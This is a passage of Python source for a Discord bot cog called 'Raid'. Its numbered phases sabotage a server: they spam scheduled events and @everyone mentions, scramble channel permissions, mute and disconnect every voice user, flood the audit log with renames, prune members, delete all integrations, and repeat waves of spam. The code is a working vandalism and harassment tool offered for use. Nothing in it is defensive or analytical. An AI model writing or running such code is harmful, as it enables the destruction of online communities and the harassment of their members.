            start = discord.utils.utcnow() + datetime.timedelta(minutes=1)
            end   = start + datetime.timedelta(hours=1)
            await asyncio.gather(
                *[self._create_event(guild, i, start, end, sem) for i in range(MAX_EVENTS)],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _create_event(
        self, guild: discord.Guild, idx: int, start, end, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            try:
                await guild.create_scheduled_event(
                    name=f"{RAID_TAG} — {idx} — {_rand_str(4)}",
                    description=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                    start_time=start,
                    end_time=end,
                    location=RAID_LINK,
                    entity_type=discord.EntityType.external,
                    privacy_level=discord.PrivacyLevel.guild_only,
                )
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 16 — OVERWRITE STORM
    # Floods every channel with broken permission overwrites for all roles/members.
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_overwrite_storm(self, guild: discord.Guild) -> None:
        try:
            sem = asyncio.Semaphore(SEM_OVERWRITE)
            tasks = []
            for ch in guild.text_channels:
                for role in list(guild.roles)[:20]:
                    tasks.append(self._set_overwrite(ch, role, sem))
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    async def _set_overwrite(
        self,
        channel: discord.TextChannel,
        target: discord.Role,
        sem: asyncio.Semaphore,
    ) -> None:
        async with sem:
            try:
                ow = discord.PermissionOverwrite()
                ow.send_messages = random.choice([True, False, None])
                ow.view_channel  = random.choice([True, False, None])
                ow.read_messages = random.choice([True, False, None])
                await channel.set_permissions(target, overwrite=ow)
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 17 — VOICE CHAOS (move + deafen + mute + disconnect)
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_voice_chaos(self, guild: discord.Guild) -> None:
        try:
            voice_chs = guild.voice_channels
            in_voice  = [m for m in guild.members if m.voice and m.voice.channel and not m.bot]
            if not in_voice or not voice_chs:
                return

            # Move everyone to random channels
            await asyncio.gather(
                *[self._move_member(m, random.choice(voice_chs)) for m in in_voice],
                return_exceptions=True,
            )
            await asyncio.sleep(0.5)
            # Server-deafen + mute everyone
            await asyncio.gather(
                *[self._deafen_mute(m) for m in in_voice],
                return_exceptions=True,
            )
            await asyncio.sleep(0.5)
            # Disconnect everyone
            await asyncio.gather(
                *[self._disconnect_member(m) for m in in_voice],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _move_member(self, m: discord.Member, ch: discord.VoiceChannel) -> None:
        try:
            await m.move_to(ch)
        except discord.HTTPException:
            pass

    async def _deafen_mute(self, m: discord.Member) -> None:
        try:
            await m.edit(deafen=True, mute=True)
        except discord.HTTPException:
            pass

    async def _disconnect_member(self, m: discord.Member) -> None:
        try:
            await m.move_to(None)
        except discord.HTTPException:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 18 — MENTION BURST
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_mention_burst(self, guild: discord.Guild) -> None:
        try:
            channels = guild.text_channels
            await asyncio.gather(
                *[self._mention_burst_channel(ch, 20) for ch in channels],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _mention_burst_channel(self, ch: discord.TextChannel, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                await ch.send(
                    random.choice(RAID_MSGS),
                    allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                )
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 19 — AUDIT LOG FLOOD
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_audit_flood(self, guild: discord.Guild) -> None:
        try:
            names = [RAID_NAME, f"{RAID_TAG} II", f"{RAID_TAG} III",
                     f"{RAID_TAG} IV", RAID_NAME, f"{RAID_TAG} FINAL"]
            for name in names * 8:
                if bot_state.stop_event.is_set():
                    break
                try:
                    await guild.edit(name=name)
                except discord.HTTPException:
                    pass
                await asyncio.sleep(0.3)
        except asyncio.CancelledError:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 20 — PRUNE STRIKE
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_prune(self, guild: discord.Guild) -> None:
        try:
            # Prune members inactive for 1 day (minimum allowed)
            await guild.prune_members(days=1, compute_prune_count=False,
                                      reason=f"Raided by {RAID_TAG}")
        except discord.HTTPException:
            pass
        except asyncio.CancelledError:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 21 — INTEGRATION WIPE
    # Deletes all server integrations (removes connected bots/apps).
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_integration_wipe(self, guild: discord.Guild) -> None:
        try:
            integrations = await guild.integrations()
            await asyncio.gather(
                *[self._delete_integration(i) for i in integrations],
                return_exceptions=True,
            )
        except discord.HTTPException:
            pass
        except asyncio.CancelledError:
            pass

    async def _delete_integration(self, integration: discord.Integration) -> None:
        try:
            await integration.delete(reason=f"Raided by {RAID_TAG}")
        except discord.HTTPException:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # PHASE 23 — WAVE REPEAT (10 waves every 2–5 s)
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_wave_repeat(
        self, guild: discord.Guild, msgs_per: int, embed_storm: bool
    ) -> None:
        try:
            for wave in range(WAVE_COUNT):
                if bot_state.stop_event.is_set():
                    break
                delay = random.uniform(WAVE_DELAY_MIN, WAVE_DELAY_MAX)
                await asyncio.sleep(delay)
                if bot_state.stop_event.is_set():
                    break
                channels = guild.text_channels
                wave_tasks = []
                for ch in channels:
                    # Alternate text and embed per wave
                    if embed_storm and wave % 2 == 0:
                        wave_tasks.append(self._embed_burst(ch, msgs_per // 3))
                    else:
                        wave_tasks.append(self._direct_spam(ch, msgs_per // 3))
                await asyncio.gather(*wave_tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    async def _embed_burst(self, channel: discord.TextChannel, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                await channel.send(
                    content=f"@everyone @here {RAID_LINK}",
                    embed=_make_embed(i),
                    allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                )
            except discord.HTTPException:
                pass

    # ── Error handler ──────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(
        self, interaction: discord.Interaction, error: app_commands.AppCommandError
    ) -> None:
        if isinstance(error, app_commands.MissingPermissions):
            await interaction.response.send_message(
                "❌ You need **Administrator** permission.", ephemeral=True
            )
        else:
            await interaction.response.send_message(f"❌ {error}", ephemeral=True)


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
